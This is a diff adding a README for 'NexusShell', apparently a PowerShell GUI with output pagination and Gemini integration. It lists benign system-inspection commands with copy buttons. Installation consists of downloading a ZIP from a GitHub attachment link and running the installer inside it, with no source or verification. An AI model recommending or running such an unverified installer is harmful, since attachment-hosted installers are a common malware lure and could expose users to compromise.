@@ -1,2 +1,174 @@
-# NexusShell
+\# NexusShell: An Accessible PowerShell Terminal
+
+
+
+NexusShell is a modern, user-friendly GUI for Windows PowerShell, meticulously crafted to provide a clear, accessible, and powerful command-line experience. It separates command input from output, eliminating the clutter of traditional terminals and making it perfect for users who rely on screen readers or require a more structured workflow.
+
+
+
+\## Key Features
+
+
+
+NexusShell isn't just another terminal. It's packed with features designed for clarity, productivity, and accessibility.
+
+
+
+\- \*\*Clutter-Free Interface\*\*: A dedicated, read-only area for command output and a separate multi-line editor for typing your next command. This clean separation is ideal for focusing on one task at a time.
+
+
+
+\- \*\*Automatic Output Pagination\*\*: Long command outputs are automatically split into navigable pages. No more losing your place in an endless scroll. You can easily move between pages using intuitive buttons or keyboard shortcuts (`PageUp`/`PageDown`).
+
+
+
+\- \*\*One-Click Full Copy\*\*: Copy the entire output from your last command to the clipboard with a single click (`Ctrl+Shift+C`), regardless of its length.
+
+
+
+\- \*\*Advanced Command Editor\*\*: Write and edit complex, multi-line scripts with ease using `Shift+Enter` for new lines. Execute the entire block by pressing `Enter`.
+
+
+
+\- \*\*Seamless Gemini Integration\*\*: Initiate a special interactive session with Google's Gemini by simply typing `gemini`. NexusShell optimizes the interaction for a smooth, conversational command flow.
+
+
+
+\- \*\*Administrator Mode Awareness\*\*: The interface clearly indicates whether you are running with standard or elevated (Administrator) privileges.
+
+
+
+\- \*\*Familiar Keyboard Shortcuts\*\*: The command input field supports standard editing shortcuts like `Ctrl+A` (Select All), `Ctrl+C` (Copy), `Ctrl+V` (Paste), and `Ctrl+Z` (Undo).
+
+
+
+\## Installation
+
+
+
+Installing NexusShell is straightforward:
+
+
+
+1\. Download the latest release: \[NexusShell.zip](https://github.com/user-attachments/files/22636844/NexusShell.zip)
+
+2\. Extract the downloaded ZIP file to your preferred location.
+
+3\. Run the installer and follow the on-screen instructions. You will be given options to create a desktop shortcut and add NexusShell to your system's PATH.
+
+
+
+\## Getting Started
+
+
+
+1\. Launch NexusShell from the Start Menu or the desktop shortcut.
+
+2\. The window will open, displaying the PowerShell prompt and indicating your privilege level.
+
+3\. Type your desired command into the \*\*Command Input\*\* box at the bottom.
+
+4\. Press \*\*Enter\*\* to execute the command.
+
+5\. If the output is long, the pagination controls will appear automatically. Use them to review the output at your own pace.
+
+
+
+\## Example Commands
+
+
+
+Try these powerful PowerShell commands in NexusShell to explore your system:
+
+
+
+\### System Information
+
+Display detailed information about your computer's hardware and operating system.
+
+```powershell
+
+systeminfo
+
+```
+
+<button onclick="navigator.clipboard.writeText('systeminfo').then(() => alert('✓ Command copied successfully!'))">📋 Copy Command</button>
+
+
+
+\### Network Configuration
+
+View all network adapter configurations including IP addresses, DNS servers, and MAC addresses.
+
+```powershell
+
+ipconfig /all
+
+```
+
+<button onclick="navigator.clipboard.writeText('ipconfig /all').then(() => alert('✓ Command copied successfully!'))">📋 Copy Command</button>
+
+
+
+\### Running Processes
+
+List all currently running processes with detailed information.
+
+```powershell
+
+Get-Process | Sort-Object CPU -Descending | Select-Object -First 10
+
+```
+
+<button onclick="navigator.clipboard.writeText('Get-Process | Sort-Object CPU -Descending | Select-Object -First 10').then(() => alert('✓ Command copied successfully!'))">📋 Copy Command</button>
+
+
+
+\### Disk Space Usage
+
+Check available disk space on all drives.
+
+```powershell
+
+Get-PSDrive -PSProvider FileSystem
+
+```
+
+<button onclick="navigator.clipboard.writeText('Get-PSDrive -PSProvider FileSystem').then(() => alert('✓ Command copied successfully!'))">📋 Copy Command</button>
+
+
+
+\### Installed Software
+
+List all installed applications on your system.
+
+```powershell
+
+Get-WmiObject -Class Win32\_Product | Select-Object Name, Version | Sort-Object Name
+
+```
+
+<button onclick="navigator.clipboard.writeText('Get-WmiObject -Class Win32\_Product | Select-Object Name, Version | Sort-Object Name').then(() => alert('✓ Command copied successfully!'))">📋 Copy Command</button>
+
+
+
+\### System Uptime
+
+Display how long your system has been running since the last restart.
+
+```powershell
+
+(Get-Date) - (Get-CimInstance Win32\_OperatingSystem).LastBootUpTime
+
+```
+
+<button onclick="navigator.clipboard.writeText('(Get-Date) - (Get-CimInstance Win32\_OperatingSystem).LastBootUpTime').then(() => alert('✓ Command copied successfully!'))">📋 Copy Command</button>
+
+
+
+---
+
+
+
+\*This documentation was generated by Gemini.\*
 
